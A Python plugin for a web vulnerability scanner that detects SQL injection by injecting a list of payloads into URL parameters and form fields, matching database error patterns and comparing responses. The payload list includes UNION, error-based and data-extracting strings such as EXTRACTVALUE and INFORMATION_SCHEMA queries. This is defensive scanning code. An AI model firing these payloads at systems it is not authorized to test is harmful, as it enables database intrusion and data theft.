"""
Web Vulnerability Scanner - SQL Injection Plugin

This plugin tests for SQL injection vulnerabilities by:
1. Identifying input parameters in URLs and forms
2. Testing each parameter with SQL injection payloads
3. Analyzing responses for error messages or unexpected behavior
"""

import logging
import re
from typing import Dict, List, Any, Set
from urllib.parse import urlparse, parse_qs, urlencode

import requests
from bs4 import BeautifulSoup

from plugins.base import Plugin
from scanner.http_client import HttpClient
from scanner.parser import HtmlParser, FormData
from scanner.reporter import Finding, Severity, Reporter

# Configure logging
logger = logging.getLogger('plugins.sql_injection')

class SqlInjectionPlugin(Plugin):
    """
    Plugin for detecting SQL injection vulnerabilities.
    """
    
    name = "sql_injection"
    description = "Tests for SQL injection vulnerabilities in parameters and forms"
    
    # Error patterns indicating potential SQL injection
    SQL_ERROR_PATTERNS = [
        # MySQL
        r"SQL syntax.*?MySQL",
        r"Warning.*?mysqli?",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your (MySQL|MariaDB) server version",
        r"Unknown column '[^']+' in 'field list'",
        
        # PostgreSQL
        r"PostgreSQL.*?ERROR",
        r"Warning.*?\\Wpg_",
        r"valid PostgreSQL result",
        r"Npgsql\\.",
        r"PG::SyntaxError:",
        
        # Microsoft SQL Server
        r"Driver.*? SQL[\-\_\ ]*Server",
        r"OLE DB.*? SQL Server",
        r"(\W|\A)SQL Server.*?Driver",
        r"Warning.*?(mssql|sqlsrv)_",
        r"(\W|\A)SQL Server.*?[0-9a-fA-F]{8}",
        r"(?s)Exception.*?\\WSystem\\.Data\\.SqlClient\\.",
        r"(?s)Exception.*?\\WRoadhouse\\.Cms\\.",
        
        # Oracle
        r"ORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Oracle.*?Driver",
        r"Warning.*?\\Woci_",
        r"Warning.*?\\Wora_",
        
        # SQLite
        r"SQLite/JDBCDriver",
        r"SQLite\\.Exception",
        r"System\\.Data\\.SQLite\\.SQLiteException",
        r"Warning.*?sqlite_",
        r"Warning.*?SQLite3::",
        r"\\[SQLITE_ERROR\\]",
        
        # Generic SQL errors
        r"(?i)sql(?:[\s\[]+)?error(?:[\s\[]+)?:",
        r"(?i)sql(?:[\s\[]+)?warning(?:[\s\[]+)?:",
        r"unclosed quotation mark after the character string",
        r"syntax error at or near",
        r"unexpected token '",
        r"unexpected end of statement",
        r"unexpected character after line continuation character",
        r"unterminated quoted string",
        r"unterminated quoted identifier"
    ]
    
    # Test payloads for SQL injection detection
    SQL_PAYLOADS = [
        # Boolean-based - more efficient test cases first
        "'",       # Simple single quote - Most efficient basic test
        "\"",      # Simple double quote
        "`",       # Backtick (MySQL)
        "' OR 1=1--", # Simple OR condition with comment
        "\" OR 1=1--", # Double quote version
        "') OR 1=1--", # For parameterized queries in parentheses
        
        # More advanced boolean-based tests
        "' OR '1'='1",
        "' OR '1'='1' --",
        "1' OR '1'='1",
        "1\" OR \"1\"=\"1",
        
        # Error-based - to trigger database errors
        "'\"",     # Mixed quotes to cause syntax errors
        "')",      # Unbalanced parenthesis
        "';--",    # Statement termination with comment
        "\"','\")", # Complex quote combination
        "' OR 1=CONVERT(int,@@version)--", # MSSQL specific
        "' AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT version()),0x7e))--", # MySQL specific
        
        # UNION-based - for data extraction
        "' UNION SELECT 1--",
        "' UNION SELECT 1,2--",
        "' UNION SELECT 1,2,3--",
        
        # Blind injection tests
        "' AND 1=1--", # Always true condition
        "' AND 1=2--", # Always false condition
        
        # Database specific tests
        "' OR 1=1 /*", # MySQL comment
        "-- ",      # SQL comment
        "#",        # MySQL comment
        
        # Advanced error-based (only used if basic tests pass)
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,USER(),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
        
        # Uncomment for time-based tests (use carefully in production)
        # "'; WAITFOR DELAY '0:0:2'--", # MSSQL
        # "'; SELECT SLEEP(2)--",       # MySQL
        # "'; pg_sleep(2)--",           # PostgreSQL
        
        # More sophisticated tests if needed
        "' OR IF(1=1,SLEEP(0),0)--", # Conditional time-based (no actual delay)
        "' OR EXISTS(SELECT 1 UNION SELECT 2)--" # Test for subquery support
    ]
    
    # Parameters that are commonly vulnerable to SQL injection
    COMMON_VULNERABLE_PARAMS = {
        'id', 'user_id', 'product_id', 'category_id', 'item', 'key', 
        'search', 'query', 'page', 'action', 'view', 'cat', 'p', 'pid', 'uid',
        'filter', 'sort', 'order', 'name', 'file', 'type', 'class', 'func'
    }
    
    def __init__(self, reporter: Reporter = None):
        """Initialize the SQL injection plugin."""
        super().__init__(reporter)
        self.tested_urls: Set[str] = set()  # Track already tested URLs to avoid duplication
    
    def scan(self, target_url: str, http_client: HttpClient) -> List[Finding]:
        """
        Scan for SQL injection vulnerabilities.
        
        Args:
            target_url: URL to scan
            http_client: HTTP client for making requests
            
        Returns:
            List[Finding]: List of findings
        """
        findings = []
        
        # Skip if already tested
        if target_url in self.tested_urls:
            return findings
        
        # Add to tested URLs
        self.tested_urls.add(target_url)
        
        self.logger.info(f"Scanning {target_url} for SQL injection vulnerabilities")
        
        try:
            # Test URL parameters
            url_findings = self._test_url_parameters(target_url, http_client)
            findings.extend(url_findings)
            
            # Get the response and parse the page
            response = http_client.get(target_url)
            if not response.ok:
                self.logger.warning(f"Failed to fetch {target_url}: {response.status_code}")
                return findings
            
            # Parse HTML
            parser = HtmlParser(target_url)
            soup = parser.parse_html(response.text)
            
            # Extract and test forms
            forms = parser.extract_forms(soup, target_url)
            form_findings = self._test_forms(forms, http_client)
            findings.extend(form_findings)
            
        except Exception as e:
            self.logger.error(f"Error scanning {target_url} for SQL injection: {e}")
        
        # Report findings
        for finding in findings:
            self.report_finding(finding)
        
        return findings
    
    def _test_url_parameters(self, url: str, http_client: HttpClient) -> List[Finding]:
        """
        Test URL parameters for SQL injection vulnerabilities.
        
        Args:
            url: URL to test
            http_client: HTTP client for making requests
            
        Returns:
            List[Finding]: List of findings
        """
        findings = []
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        if not query_params:
            return findings
        
        # Get baseline response
        try:
            baseline_response = http_client.get(url)
            baseline_content = baseline_response.text
            baseline_status = baseline_response.status_code
        except Exception as e:
            self.logger.error(f"Error getting baseline response for {url}: {e}")
            return findings
        
        # Test each parameter
        for param, values in query_params.items():
            # Skip testing if param doesn't seem injectable
            if not self._is_likely_injectable(param, values[0]):
                continue
                
            # Original value
            original_value = values[0]
            
            # Test each payload
            for payload in self.SQL_PAYLOADS:
                # Skip large payloads for numeric parameters
                if original_value.isdigit() and len(payload) > 10:
                    continue
                
                # Create a new URL with the SQL injection payload
                new_params = query_params.copy()
                new_params[param] = [payload]
                query_string = urlencode(new_params, doseq=True)
                
                path = parsed_url.path or '/'
                new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{path}?{query_string}"
                
                try:
                    # Send the request with the payload
                    response = http_client.get(new_url)
                    
                    # Check for SQL errors in the response
                    if self._contains_sql_error(response.text):
                        finding = Finding(
                            title=f"SQL Injection in URL parameter '{param}'",
                            description=(
                                f"The parameter '{param}' appears to be vulnerable to SQL injection. "
                                f"The application returned a SQL error when testing with payload: {payload}"
                            ),
                            url=url,
                            severity=Severity.HIGH,
                            plugin_name=self.name,
                            evidence=f"Payload: {payload}\n\nError response:\n{self._extract_error_context(response.text)}",
                            request_data={"url": new_url, "method": "GET"},
                            response_data={"status": response.status_code, "length": len(response.text)},
                            remediation=(
                                "1. Use parameterized statements or prepared statements.\n"
                                "2. Apply input validation and sanitization.\n"
                                "3. Use an ORM (Object Relational Mapper) if applicable.\n"
                                "4. Apply the principle of least privilege to the database user."
                            ),
                            cwe_id="89"  # CWE-89: SQL Injection
                        )
                        findings.append(finding)
                        
                        # Stop testing this parameter after finding a vulnerability
                        break
                    
                    # Check for boolean-based injection by comparing responses
                    elif self._is_boolean_based_injection(baseline_content, response.text, baseline_status, response.status_code):
                        finding = Finding(
                            title=f"Potential Boolean-Based SQL Injection in URL parameter '{param}'",
                            description=(
                                f"The parameter '{param}' appears to be vulnerable to boolean-based SQL injection. "
                                f"The application returned a different response when testing with payload: {payload}"
                            ),
                            url=url,
                            severity=Severity.HIGH,
                            plugin_name=self.name,
                            evidence=f"Payload: {payload}\n\nResponse differs significantly from baseline.",
                            request_data={"url": new_url, "method": "GET"},
                            response_data={"status": response.status_code, "length": len(response.text)},
                            remediation=(
                                "1. Use parameterized statements or prepared statements.\n"
                                "2. Apply input validation and sanitization.\n"
                                "3. Use an ORM (Object Relational Mapper) if applicable.\n"
                                "4. Apply the principle of least privilege to the database user."
                            ),
                            cwe_id="89"  # CWE-89: SQL Injection
                        )
                        findings.append(finding)
                        
                        # Stop testing this parameter after finding a vulnerability
                        break
                        
                except Exception as e:
                    self.logger.error(f"Error testing {new_url} with payload {payload}: {e}")
        
        return findings
    
    def _test_forms(self, forms: List[FormData], http_client: HttpClient) -> List[Finding]:
        """
        Test forms for SQL injection vulnerabilities.
        
        Args:
            forms: List of forms to test
            http_client: HTTP client for making requests
            
        Returns:
            List[Finding]: List of findings
        """
        findings = []
        
        for form in forms:
            # Skip forms with file uploads or no inputs
            if form.enctype == 'multipart/form-data' or not form.inputs:
                continue
            
            # Get baseline response by submitting the form with empty values
            form_data = {}
            for input_name, attrs in form.inputs.items():
                # Skip non-text inputs
                input_type = attrs.get('type', 'text').lower()
                if input_type in ['checkbox', 'radio', 'button', 'submit', 'image', 'file']:
                    continue
                
                # Add empty value
                form_data[input_name] = ''
            
            # Skip if no injectable fields
            if not form_data:
                continue
            
            try:
                # Get baseline response
                if form.method.upper() == 'POST':
                    baseline_response = http_client.post(form.action, data=form_data)
                else:
                    # For GET, encode the parameters in the URL
                    query_string = urlencode(form_data)
                    url = f"{form.action}?{query_string}" if '?' not in form.action else f"{form.action}&{query_string}"
                    baseline_response = http_client.get(url)
                
                baseline_content = baseline_response.text
                baseline_status = baseline_response.status_code
            except Exception as e:
                self.logger.error(f"Error getting baseline response for form {form.action}: {e}")
                continue
            
            # Test each input field
            for input_name in form_data.keys():
                # Skip testing if param doesn't seem injectable
                if not self._is_likely_injectable(input_name, ''):
                    continue
                
                # Test each payload
                for payload in self.SQL_PAYLOADS:
                    # Create new form data with the payload
                    test_data = form_data.copy()
                    test_data[input_name] = payload
                    
                    try:
                        # Send the request with the payload
                        if form.method.upper() == 'POST':
                            response = http_client.post(form.action, data=test_data)
                        else:
                            # For GET, encode the parameters in the URL
                            query_string = urlencode(test_data)
                            url = f"{form.action}?{query_string}" if '?' not in form.action else f"{form.action}&{query_string}"
                            response = http_client.get(url)
                        
                        # Check for SQL errors in the response
                        if self._contains_sql_error(response.text):
                            finding = Finding(
                                title=f"SQL Injection in form field '{input_name}'",
                                description=(
                                    f"The form field '{input_name}' on {form.action} appears to be vulnerable to SQL injection. "
                                    f"The application returned a SQL error when testing with payload: {payload}"
                                ),
                                url=form.action,
                                severity=Severity.HIGH,
                                plugin_name=self.name,
                                evidence=f"Form method: {form.method}\nField: {input_name}\nPayload: {payload}\n\n"
                                         f"Error response:\n{self._extract_error_context(response.text)}",
                                request_data={"url": form.action, "method": form.method, "data": test_data},
                                response_data={"status": response.status_code, "length": len(response.text)},
                                remediation=(
                                    "1. Use parameterized statements or prepared statements.\n"
                                    "2. Apply input validation and sanitization.\n"
                                    "3. Use an ORM (Object Relational Mapper) if applicable.\n"
                                    "4. Apply the principle of least privilege to the database user."
                                ),
                                cwe_id="89"  # CWE-89: SQL Injection
                            )
                            findings.append(finding)
                            
                            # Stop testing this field after finding a vulnerability
                            break
                        
                        # Check for boolean-based injection by comparing responses
                        elif self._is_boolean_based_injection(baseline_content, response.text, baseline_status, response.status_code):
                            finding = Finding(
                                title=f"Potential Boolean-Based SQL Injection in form field '{input_name}'",
                                description=(
                                    f"The form field '{input_name}' on {form.action} appears to be vulnerable to boolean-based SQL injection. "
                                    f"The application returned a different response when testing with payload: {payload}"
                                ),
                                url=form.action,
                                severity=Severity.HIGH,
                                plugin_name=self.name,
                                evidence=f"Form method: {form.method}\nField: {input_name}\nPayload: {payload}\n\n"
                                         f"Response differs significantly from baseline.",
                                request_data={"url": form.action, "method": form.method, "data": test_data},
                                response_data={"status": response.status_code, "length": len(response.text)},
                                remediation=(
                                    "1. Use parameterized statements or prepared statements.\n"
                                    "2. Apply input validation and sanitization.\n"
                                    "3. Use an ORM (Object Relational Mapper) if applicable.\n"
                                    "4. Apply the principle of least privilege to the database user."
                                ),
                                cwe_id="89"  # CWE-89: SQL Injection
                            )
                            findings.append(finding)
                            
                            # Stop testing this field after finding a vulnerability
                            break
                            
                    except Exception as e:
                        self.logger.error(f"Error testing form {form.action} field {input_name} with payload {payload}: {e}")
        
        return findings
    
    def _contains_sql_error(self, content: str) -> bool:
        """
        Check if the response contains SQL error messages.
        
        Args:
            content: Response content to check
            
        Returns:
            bool: True if SQL error is found, False otherwise
        """
        for pattern in self.SQL_ERROR_PATTERNS:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        return False
    
    def _extract_error_context(self, content: str, context_length: int = 200) -> str:
        """
        Extract context around SQL error for evidence.
        
        Args:
            content: Response content
            context_length: Length of context to extract
            
        Returns:
            str: Context around SQL error
        """
        for pattern in self.SQL_ERROR_PATTERNS:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                start = max(0, match.start() - context_length // 2)
                end = min(len(content), match.end() + context_length // 2)
                return content[start:end].strip()
        return "No SQL error pattern found"
    
    def _is_boolean_based_injection(self, baseline_content: str, response_content: str, baseline_status: int, response_status: int) -> bool:
        """
        Detect boolean-based SQL injections by comparing responses.
        
        Args:
            baseline_content: Content of baseline response
            response_content: Content of test response
            baseline_status: Status code of baseline response
            response_status: Status code of test response
            
        Returns:
            bool: True if boolean-based injection is detected, False otherwise
        """
        # Skip if response is identical to baseline
        if baseline_content == response_content and baseline_status == response_status:
            return False
            
        # Check for significant status code changes
        if baseline_status != response_status:
            # Status change to success code could indicate injection success
            if response_status in [200, 302] and baseline_status >= 400:
                return True
            # Status change from success to error could indicate injection failure
            elif baseline_status in [200, 302] and response_status >= 400:
                # This might be a false positive, so require more evidence
                if self._significant_content_difference(baseline_content, response_content):
                    return True
        
        # Check for significant content length changes
        baseline_length = len(baseline_content)
        response_length = len(response_content)
        
        # Very different response size
        if baseline_length > 0:
            # Calculate percentage difference
            difference_ratio = abs(response_length - baseline_length) / baseline_length
            
            # If significant difference (>30%)
            if difference_ratio > 0.3:
                # Additional check to reduce false positives
                if self._has_different_data_patterns(baseline_content, response_content):
                    return True
        
        # Analyze content structure changes
        if baseline_content and response_content:
            # Extract text from HTML for comparison
            try:
                baseline_soup = BeautifulSoup(baseline_content, 'html.parser')
                test_soup = BeautifulSoup(response_content, 'html.parser')
                
                # Compare number of tables (SQL results often in tables)
                baseline_tables = len(baseline_soup.find_all('table'))
                test_tables = len(test_soup.find_all('table'))
                if abs(baseline_tables - test_tables) > 0:
                    return True
                
                # Compare text content
                baseline_text = baseline_soup.get_text()
                test_text = test_soup.get_text()
                
                # Check for error/success message differences
                error_patterns = ['no result', 'not found', 'invalid', 'error']
                success_patterns = ['result', 'record', 'found', 'success']
                
                # Check for error message changes
                has_baseline_errors = any(msg in baseline_text.lower() for msg in error_patterns)
                has_test_errors = any(msg in test_text.lower() for msg in error_patterns)
                
                # Check for success message changes
                has_baseline_success = any(msg in baseline_text.lower() for msg in success_patterns)
                has_test_success = any(msg in test_text.lower() for msg in success_patterns)
                
                # If message patterns changed
                if has_baseline_errors != has_test_errors or has_baseline_success != has_test_success:
                    return True
                    
            except Exception:
                # Fallback if HTML parsing fails
                pass
                
            # Remove dynamic content like timestamps, session IDs, etc.
            cleaned_baseline = self._remove_dynamic_content(baseline_content)
            cleaned_response = self._remove_dynamic_content(response_content)
            
            # Compare the cleaned content
            if cleaned_baseline and cleaned_response and cleaned_baseline != cleaned_response:
                # Calculate similarity ratio
                similarity = self._calculate_similarity(cleaned_baseline, cleaned_response)
                # If similarity is low enough, consider it a positive
                if similarity < 0.7:  # Less than 70% similar
                    return True
        
        return False
        
    def _significant_content_difference(self, content1: str, content2: str) -> bool:
        """Determine if two response contents have significant differences."""
        # Remove whitespace and normalize
        content1_norm = re.sub(r'\s+', ' ', content1).strip().lower()
        content2_norm = re.sub(r'\s+', ' ', content2).strip().lower()
        
        # If one is much larger than the other
        len1, len2 = len(content1_norm), len(content2_norm)
        if max(len1, len2) > 2 * min(len1, len2):
            return True
            
        # Check if contents are substantially different
        if len1 > 100 and len2 > 100:  # Only for non-trivial content
            # Take a sample from each content for comparison
            sample_size = min(500, min(len1, len2))
            similarity = self._calculate_similarity(content1_norm[:sample_size], content2_norm[:sample_size])
            return similarity < 0.8
            
        return False
    
    def _has_different_data_patterns(self, content1: str, content2: str) -> bool:
        """Check if the data patterns (like tables, lists) are different between responses."""
        # Look for HTML patterns that often contain data
        patterns = [r'<table[^>]*>.*?</table>', r'<ul[^>]*>.*?</ul>', r'<ol[^>]*>.*?</ol>', 
                   r'<select[^>]*>.*?</select>', r'<div[^>]*class=["\']result']
                   
        for pattern in patterns:
            matches1 = re.findall(pattern, content1, re.DOTALL | re.IGNORECASE)
            matches2 = re.findall(pattern, content2, re.DOTALL | re.IGNORECASE)
            
            # If number of matches differs significantly
            if abs(len(matches1) - len(matches2)) > 0:
                return True
        
        return False
        
    def _remove_dynamic_content(self, content: str) -> str:
        """Remove dynamic content like timestamps, random IDs, etc."""
        # Remove common dynamic elements
        cleaned = content
        
        # Remove timestamps in various formats
        cleaned = re.sub(r'\d{2}[/:-]\d{2}[/:-]\d{2,4}(\s\d{1,2}:\d{2}(:\d{2})?)?', '', cleaned)
        
        # Remove random hashes and IDs
        cleaned = re.sub(r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}', '', cleaned)
        cleaned = re.sub(r'[a-f0-9]{32}', '', cleaned)  # md5 hashes
        
        # Remove CSRF tokens and other security tokens
        cleaned = re.sub(r'value=["\'][a-zA-Z0-9+/=_-]{20,}["\']', 'value="TOKEN"', cleaned)
        
        return cleaned
    
    def _calculate_similarity(self, str1: str, str2: str) -> float:
        """Calculate simple similarity ratio between two strings."""
        # For short strings
        if len(str1) < 100 or len(str2) < 100:
            # Simple ratio of matching characters
            matches = sum(c1 == c2 for c1, c2 in zip(str1, str2))
            return matches / max(len(str1), len(str2))
        
        # For longer strings, use a more efficient approach
        # Compare character frequency distributions
        freq1 = {}
        freq2 = {}
        
        for c in str1:
            freq1[c] = freq1.get(c, 0) + 1
        
        for c in str2:
            freq2[c] = freq2.get(c, 0) + 1
            
        # Calculate similarity based on character frequency
        all_chars = set(freq1.keys()) | set(freq2.keys())
        similarity = 0
        
        for c in all_chars:
            similarity += min(freq1.get(c, 0), freq2.get(c, 0))
            
        return similarity / max(sum(freq1.values()), sum(freq2.values()))
    
    def _is_likely_injectable(self, param_name: str, param_value: str) -> bool:
        """
        Determine if a parameter is likely to be injectable.
        
        Args:
            param_name: Name of the parameter
            param_value: Current value of the parameter
            
        Returns:
            bool: True if parameter is likely injectable, False otherwise
        """
        # Common vulnerable parameter names
        if param_name.lower() in self.COMMON_VULNERABLE_PARAMS:
            return True
            
        # Parameters with numeric values are often database IDs
        if param_value and param_value.isdigit():
            return True
            
        # Parameters that sound like database operations
        if any(op in param_name.lower() for op in ['select', 'query', 'search', 'filter', 'sort', 'order', 'group']):
            return True
            
        # Check for likely ID parameters
        if 'id' in param_name.lower() or '_id' in param_name.lower():
            return True
            
        # Default to checking parameters with short names
        return len(param_name) <= 3
